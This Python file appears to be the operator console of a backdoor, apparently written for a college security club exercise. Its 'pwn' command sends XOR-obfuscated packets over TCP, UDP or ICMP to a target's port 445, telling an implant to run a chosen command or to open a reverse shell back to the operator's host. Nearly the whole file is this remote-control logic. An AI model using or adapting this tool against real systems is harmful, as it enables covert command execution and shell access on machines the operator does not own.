import scapy.all as scapy

""" 
set
- mode (shell vs cmd)
- transport (i/u/t)
- lhost (get from eth adapter)
- rhost (REQUIRED)
- lport (6006)
- rport (445)
- command (whoami)
- if mode is shell, listen on lhost:lport
- if mode is cmd, use cmd option
show
- all



"""

def xor_encrypt(byte_msg, byte_key):
	encrypt_byte = b''
	for b in byte_msg:
		# print(byte_msg, byte_key, b)
		encrypt_byte += chr(b ^ byte_key).encode()
	return encrypt_byte

def print_help():
	print("read the fucking readme")

def main():
	print("""
	____               __                  ____
   / __/__  ____ ___  / /_____  ________  / / /
  / /_/ _ \/ __ `__ \/ __/ __ \/ ___/ _ \/ / / 
 / __/  __/ / / / / / /_/ /_/ / /__/  __/ / /  
/_/  \___/_/ /_/ /_/\__/\____/\___/\___/_/_/   

	~ kindtime & jake

	""")


	params = {
		"mode":"cmd", 
		"transport":"tcp", 
		"lhost": "",
		"rhost": "",
		"lport": 6006,
		"rport": 445,
		"command": "explorer.exe https://ritsec.club"
	}

	while(True):
		user_in = input("femtocell ~ ").split()
		if(len(user_in) > 1):
			user_cmd = user_in[0]
			if(user_cmd == "set"):
				params[user_in[1]] = user_in[2]
			if(user_cmd == "show"):
				if(user_in[1] == "all"):
					print(str(params))
				else:
					print(params[user_in[1]])
		elif(user_in[0] == "pwn"):
			if params["mode"] == "shell":
				plaintext = "FC-SH-{}\00".format(params["lhost"])
			else:			
				plaintext = "FC-CM-{}\00".format(params["command"])
			encrypted = xor_encrypt(plaintext.encode(), 0x10)
			print(encrypted.decode())	
			if(params["transport"] == "udp"):
				scapy.send(scapy.IP(dst=params["rhost"].encode(), src=params["lhost"].encode())/
				scapy.UDP(sport=params["lport"], dport=params["rport"])/
				encrypted)
			elif(params["transport"] == "tcp"):
				scapy.send(scapy.IP(dst=params["rhost"].encode(), src=params["lhost"].encode())/
				scapy.TCP(sport=params["lport"], dport=params["rport"], flags="AP")/
				encrypted)
			elif(params["transport"] == "icmp"):
				scapy.send(scapy.IP(dst=params["rhost"].encode(), src=params["lhost"].encode())/
				scapy.ICMP(code=1, type=8)/
				encrypted)	
		else:
			print_help()



if(__name__ == "__main__"):
	main()